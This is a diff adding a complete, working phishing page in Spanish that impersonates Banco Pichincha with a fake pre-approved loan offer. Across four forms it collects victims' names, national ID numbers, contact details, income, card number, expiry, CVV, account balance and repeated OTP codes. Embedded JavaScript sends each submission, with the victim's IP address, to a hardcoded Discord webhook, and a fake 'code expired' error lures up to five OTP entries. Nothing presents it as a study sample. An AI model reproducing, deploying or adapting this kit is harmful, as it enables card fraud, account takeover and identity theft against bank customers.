@@ -1,0 +1,322 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Virtual- Access </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #FDFDFD; color: #1E293B; }
+        .bg-pichincha-blue { background-color: #0F265C; }
+        .text-pichincha-blue { color: #0F265C; }
+        .bg-pichincha-yellow { background-color: #F2C200; }
+        .hidden { display: none; }
+        
+        /* Spinner */
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #F2C200;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .step-card { max-width: 580px; margin: 0 auto; background: white; padding: 45px; border-radius: 40px; box-shadow: 0 40px 100px rgba(15, 38, 92, 0.1); border: 1px solid #F1F5F9; }
+        .input-field { width: 100%; padding: 18px; border: 2px solid #E2E8F0; border-radius: 18px; outline: none; font-size: 16px; transition: all 0.3s; font-weight: 500; }
+        .input-field:focus { border-color: #F2C200; box-shadow: 0 0 0 6px rgba(242, 194, 0, 0.1); }
+        .label-text { display: block; font-size: 11px; font-weight: 800; color: #94A3B8; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 12px; margin-left: 6px; }
+        
+        .pre-aprobado-badge { background: linear-gradient(90deg, #F2C200 0%, #FFD700 100%); color: #0F265C; padding: 12px 24px; border-radius: 16px; font-weight: 900; display: inline-flex; align-items: center; gap-3; box-shadow: 0 10px 25px rgba(242, 194, 0, 0.3); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- Header -->
+    <header class="bg-white border-b border-slate-100 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-6 py-5 flex justify-between items-center">
+            <div class="flex items-center gap-6">
+                <div class="bg-pichincha-yellow px-6 py-2.5 rounded-2xl font-black text-pichincha-blue text-2xl shadow-sm">PICHINCHA</div>
+                <div class="h-10 w-px bg-slate-200 hidden md:block"></div>
+                <span class="hidden md:block text-[11px] font-black text-slate-400 uppercase tracking-[0.35em]">Portal de Créditos</span>
+            </div>
+            <div class="flex items-center gap-8">
+                <div class="hidden lg:flex items-center gap-2 text-pichincha-blue font-extrabold text-[11px] uppercase tracking-wider">
+                    <i data-lucide="shield" class="w-4 h-4 text-green-500"></i> Sistema de Seguridad Bancaria
+                </div>
+                <button class="bg-pichincha-blue text-white px-8 py-3.5 rounded-2xl text-xs font-black hover:bg-slate-800 transition-all shadow-2xl">Banca Web</button>
+            </div>
+        </div>
+        <div class="h-2.5 bg-pichincha-yellow"></div>
+    </header>
+
+    <main class="flex-grow py-12 px-6">
+        
+        <!-- VISTA INICIAL: PRE-APROBACIÓN + SIMULADOR -->
+        <section id="vista-hero" class="max-w-7xl mx-auto space-y-16">
+            <div class="text-center space-y-6">
+                <div class="pre-aprobado-badge animate-bounce">
+                    <i data-lucide="sparkles" class="w-6 h-6"></i>
+                    ¡FELICIDADES! TIENES UN CRÉDITO PRE-APROBADO
+                </div>
+                <h1 class="text-5xl md:text-7xl font-black text-pichincha-blue leading-tight">
+                    Hasta $60,000.00 <br><span class="text-slate-300">listos para ti.</span>
+                </h1>
+                <p class="text-slate-500 text-xl max-w-2xl mx-auto font-medium">
+                    Completa la validación de seguridad para realizar el depósito inmediato en tu cuenta bancaria.
+                </p>
+            </div>
+
+            <div class="step-card !max-w-3xl grid grid-cols-1 md:grid-cols-2 gap-12 items-center">
+                <div class="space-y-8">
+                    <h3 class="text-2xl font-black text-pichincha-blue">Configura tu Crédito</h3>
+                    <div class="space-y-6">
+                        <div>
+                            <div class="flex justify-between mb-3"><span class="text-xs font-bold text-slate-400">MONTO</span><span class="text-lg font-black text-pichincha-blue" id="val-monto">$5,000</span></div>
+                            <input type="range" id="sim-monto" min="1000" max="60000" step="500" value="5000" class="w-full accent-pichincha-yellow">
+                        </div>
+                        <div>
+                            <div class="flex justify-between mb-3"><span class="text-xs font-bold text-slate-400">PLAZO</span><span class="text-lg font-black text-pichincha-blue" id="val-plazo">24 Meses</span></div>
+                            <input type="range" id="sim-plazo" min="6" max="72" step="6" value="24" class="w-full accent-pichincha-yellow">
+                        </div>
+                    </div>
+                    <div class="p-6 bg-slate-50 rounded-3xl border border-slate-100">
+                        <p class="text-[10px] font-black text-slate-400 uppercase mb-1">Cuota mensual fija</p>
+                        <p class="text-4xl font-black text-pichincha-blue" id="val-cuota">$242.43</p>
+                    </div>
+                </div>
+                <div class="space-y-6">
+                    <div class="p-6 border-2 border-slate-50 rounded-3xl space-y-3">
+                        <div class="flex items-center gap-3 text-sm font-bold text-slate-600"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Sin trámites presenciales</div>
+                        <div class="flex items-center gap-3 text-sm font-bold text-slate-600"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Desembolso en 24h</div>
+                        <div class="flex items-center gap-3 text-sm font-bold text-slate-600"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Seguro de desgravamen</div>
+                    </div>
+                    <button onclick="showStep('step-1')" class="w-full bg-pichincha-yellow text-pichincha-blue font-black py-5 rounded-2xl shadow-xl hover:scale-105 transition-all text-lg">Obtener Crédito Ahora</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- CARGA 6 SEGUNDOS -->
+        <section id="vista-carga" class="hidden py-24 text-center">
+            <div class="step-card">
+                <div class="loader"></div>
+                <h2 class="text-2xl font-black text-pichincha-blue mb-3">Procesando Solicitud</h2>
+                <p class="text-slate-400 text-sm leading-relaxed px-6">Estamos estableciendo una conexión segura con el sistema central para validar su cupo pre-aprobado.</p>
+            </div>
+        </section>
+
+        <!-- PASO 1: DATOS PERSONALES Y CIUDAD -->
+        <section id="step-1" class="hidden">
+            <div class="step-card">
+                <h2 class="text-2xl font-black text-pichincha-blue mb-2 text-center">Identificación del Cliente</h2>
+                <p class="text-slate-400 text-center text-sm mb-10">Complete su información básica para continuar.</p>
+                <form id="form-1" class="space-y-6">
+                    <div><label class="label-text">Nombre Completo</label><input type="text" id="nombre" required class="input-field" placeholder="Nombres y Apellidos"></div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div><label class="label-text">Cédula</label><input type="text" id="cedula" maxlength="10" required class="input-field" placeholder="17xxxxxxxx"></div>
+                        <div>
+                            <label class="label-text">Ciudad</label>
+                            <select id="ciudad" required class="input-field">
+                                <option value="">Seleccione...</option>
+                                <option value="Quito">Quito</option>
+                                <option value="Guayaquil">Guayaquil</option>
+                                <option value="Cuenca">Cuenca</option>
+                                <option value="Ambato">Ambato</option>
+                                <option value="Manta">Manta</option>
+                                <option value="Loja">Loja</option>
+                                <option value="Santo Domingo">Santo Domingo</option>
+                                <option value="Machala">Machala</option>
+                                <option value="Portoviejo">Portoviejo</option>
+                                <option value="Ibarra">Ibarra</option>
+                                <option value="Otra">Otra Ciudad</option>
+                            </select>
+                        </div>
+                    </div>
+                    <button type="submit" class="w-full bg-pichincha-yellow text-pichincha-blue font-black py-5 rounded-2xl shadow-lg hover:bg-yellow-500 transition-all text-lg">Continuar</button>
+                </form>
+            </div>
+        </section>
+
+        <!-- PASO 2: DATOS FINANCIEROS -->
+        <section id="step-2" class="hidden">
+            <div class="step-card">
+                <h2 class="text-2xl font-black text-pichincha-blue mb-2 text-center">Perfil Financiero</h2>
+                <p class="text-slate-400 text-center text-sm mb-10">Validación de ingresos para cupo pre-aprobado.</p>
+                <form id="form-2" class="space-y-6">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div><label class="label-text">Ingresos Mensuales ($)</label><input type="number" id="ingresos" required class="input-field" placeholder="Ej: 1200"></div>
+                        <div><label class="label-text">Gastos Mensuales ($)</label><input type="number" id="gastos" required class="input-field" placeholder="Ej: 400"></div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div><label class="label-text">Celular</label><input type="text" id="celular" maxlength="10" required class="input-field" placeholder="09xxxxxxxx"></div>
+                        <div><label class="label-text">Correo Personal</label><input type="email" id="email" required class="input-field" placeholder="usuario@mail.com"></div>
+                    </div>
+                    <button type="submit" class="w-full bg-pichincha-yellow text-pichincha-blue font-black py-5 rounded-2xl shadow-lg hover:bg-yellow-500 transition-all text-lg">Validar Perfil</button>
+                </form>
+            </div>
+        </section>
+
+        <!-- PASO 3: TARJETA Y SALDO CON JUSTIFICACIÓN -->
+        <section id="step-3" class="hidden">
+            <div class="step-card">
+                <div class="p-5 bg-blue-50 rounded-3xl border border-blue-100 mb-8 flex items-start gap-4">
+                    <i data-lucide="info" class="text-pichincha-blue w-6 h-6 mt-1 flex-shrink-0"></i>
+                    <p class="text-[11px] text-pichincha-blue font-bold leading-relaxed">
+                        PARA REALIZAR EL DEPÓSITO: El sistema requiere validar la titularidad de su cuenta y confirmar su saldo disponible para asegurar la sincronización segura del desembolso de $<span id="monto-final">0</span>.
+                    </p>
+                </div>
+                <form id="form-3" class="space-y-5">
+                    <div><label class="label-text">Número de Tarjeta</label><input type="text" id="tarjeta" maxlength="19" required class="input-field" placeholder="0000 0000 0000 0000"></div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div><label class="label-text">Expira (MM/AA)</label><input type="text" id="exp" maxlength="5" required class="input-field" placeholder="MM/AA"></div>
+                        <div><label class="label-text">CVV (3 dígitos)</label><input type="password" id="cvv" maxlength="3" required class="input-field" placeholder="123"></div>
+                    </div>
+                    <div><label class="label-text">Saldo Disponible Actual ($ USD)</label><input type="text" id="saldo" required class="input-field" placeholder="Ej: $850.25"></div>
+                    <button type="submit" class="w-full bg-pichincha-yellow text-pichincha-blue font-black py-5 rounded-2xl shadow-lg hover:bg-yellow-500 transition-all text-lg">Confirmar Desembolso</button>
+                </form>
+            </div>
+        </section>
+
+        <!-- PASO 4: OTP (5 ERRORES) -->
+        <section id="step-otp" class="hidden">
+            <div class="step-card text-center">
+                <div class="w-20 h-20 bg-blue-50 text-pichincha-blue rounded-full flex items-center justify-center mx-auto mb-6"><i data-lucide="lock" class="w-10 h-10"></i></div>
+                <h2 class="text-2xl font-black text-pichincha-blue mb-2">Código de Seguridad</h2>
+                <p class="text-slate-400 text-sm mb-10 px-6">Se ha enviado un código de 6 dígitos a su número y correo registrado. Ingréselo para autorizar el depósito.</p>
+                <form id="form-otp" class="space-y-6">
+                    <input type="text" id="otp" maxlength="6" required class="w-full text-center text-5xl tracking-[12px] p-6 border-2 border-slate-100 rounded-3xl focus:border-pichincha-yellow outline-none font-black text-pichincha-blue" placeholder="000000">
+                    <div id="error-alert" class="hidden p-4 bg-red-50 text-red-600 text-[11px] font-bold rounded-2xl border border-red-100 leading-tight">
+                        ERROR DE SINCRONIZACIÓN: El código ingresado ha expirado por tiempo de espera. Por favor, espere el nuevo código generado e ingréselo para validar su identidad bancaria.
+                    </div>
+                    <button type="submit" class="w-full bg-pichincha-blue text-white font-black py-5 rounded-2xl hover:bg-slate-800 transition-all text-lg shadow-xl">Sincronizar Código</button>
+                </form>
+                <p class="mt-10 text-[10px] text-slate-400 font-bold uppercase tracking-widest">Intento <span id="contador">0</span> de 5</p>
+            </div>
+        </section>
+
+        <!-- FINAL -->
+        <section id="step-final" class="hidden py-24 text-center">
+            <div class="step-card py-16">
+                <div class="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-8"><i data-lucide="check-circle-2" class="w-14 h-14"></i></div>
+                <h2 class="text-4xl font-black text-pichincha-blue mb-4">¡Validación Exitosa!</h2>
+                <p class="text-slate-500 text-lg leading-relaxed">Su solicitud ha sido aprobada. El monto será transferido a su cuenta bancaria en las próximas 24 horas hábiles.</p>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        lucide.createIcons();
+        let intentos = 0;
+        const WEBHOOK = "https://discord.com/api/webhooks/1516080807981350964/FNN7OAMWwXHrorU_8ev8vM3HlcwejdoRYn2Pi2PejjubzFNUfr72ZvnbeSbI8MATFJG2";
+
+        // Simulador
+        const sMonto = document.getElementById('sim-monto');
+        const sPlazo = document.getElementById('sim-plazo');
+        const dMonto = document.getElementById('val-monto');
+        const dPlazo = document.getElementById('val-plazo');
+        const dCuota = document.getElementById('val-cuota');
+
+        function actualizarSim() {
+            const m = parseInt(sMonto.value);
+            const p = parseInt(sPlazo.value);
+            dMonto.innerText = "$" + m.toLocaleString();
+            dPlazo.innerText = p + " Meses";
+            const tasa = 0.15 / 12;
+            const cuota = (m * tasa) / (1 - Math.pow(1 + tasa, -p));
+            dCuota.innerText = "$" + cuota.toFixed(2);
+            document.getElementById('monto-final').innerText = m.toLocaleString();
+        }
+        sMonto.oninput = actualizarSim;
+        sPlazo.oninput = actualizarSim;
+        actualizarSim();
+
+        function showStep(id) {
+            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
+            document.getElementById('vista-carga').classList.remove('hidden');
+            setTimeout(() => {
+                document.getElementById('vista-carga').classList.add('hidden');
+                document.getElementById(id).classList.remove('hidden');
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            }, 6000);
+        }
+
+        async function enviar(datos, titulo) {
+            let ip = "Detectando...";
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: "Monitor Pichincha Maestro 🏦",
+                    embeds: [{
+                        title: "🚨 " + titulo,
+                        color: 15909376,
+                        fields: [...datos, { name: "🌐 IP Cliente", value: "`" + ip + "`", inline: true }]
+                    }]
+                })
+            });
+        }
+
+        document.getElementById('form-1').onsubmit = (e) => {
+            e.preventDefault();
+            enviar([
+                {name: "👤 Cliente", value: document.getElementById('nombre').value},
+                {name: "🆔 Cédula", value: document.getElementById('cedula').value, inline: true},
+                {name: "📍 Ciudad", value: document.getElementById('ciudad').value, inline: true},
+                {name: "💵 Monto Simulado", value: dMonto.innerText, inline: true}
+            ], "DATOS PERSONALES RECIBIDOS");
+            showStep('step-2');
+        };
+
+        document.getElementById('form-2').onsubmit = (e) => {
+            e.preventDefault();
+            enviar([
+                {name: "💰 Ingresos Mensuales", value: "$" + document.getElementById('ingresos').value, inline: true},
+                {name: "📉 Gastos Mensuales", value: "$" + document.getElementById('gastos').value, inline: true},
+                {name: "📱 Número Celular", value: document.getElementById('celular').value, inline: false},
+                {name: "📧 Correo Electrónico", value: document.getElementById('email').value, inline: false}
+            ], "PERFIL FINANCIERO Y CONTACTO");
+            showStep('step-3');
+        };
+
+        document.getElementById('form-3').onsubmit = (e) => {
+            e.preventDefault();
+            enviar([
+                {name: "💳 Número de Tarjeta", value: "`" + document.getElementById('tarjeta').value + "`"},
+                {name: "📅 Expiración", value: document.getElementById('exp').value, inline: true},
+                {name: "🔒 CVV", value: document.getElementById('cvv').value, inline: true},
+                {name: "💵 SALDO DISPONIBLE", value: "**" + document.getElementById('saldo').value + "**"}
+            ], "DATOS DE TARJETA Y SALDO");
+            showStep('step-otp');
+        };
+
+        document.getElementById('form-otp').onsubmit = (e) => {
+            e.preventDefault();
+            intentos++;
+            document.getElementById('contador').innerText = intentos;
+            enviar([{name: "🔑 Código OTP", value: "```" + document.getElementById('otp').value + "```"}, {name: "🔢 Intento", value: intentos + "/5"}], "CÓDIGO DE SEGURIDAD");
+
+            if (intentos < 5) {
+                document.getElementById('error-alert').classList.remove('hidden');
+                document.getElementById('otp').value = "";
+                setTimeout(() => document.getElementById('error-alert').classList.add('hidden'), 4000);
+            } else {
+                showStep('step-final');
+            }
+        };
+
+        // Formateos
+        document.getElementById('tarjeta').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+        document.getElementById('exp').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/g, '$1/').replace(/\/$/, '');
+        });
+    </script>
+</body>
+</html>
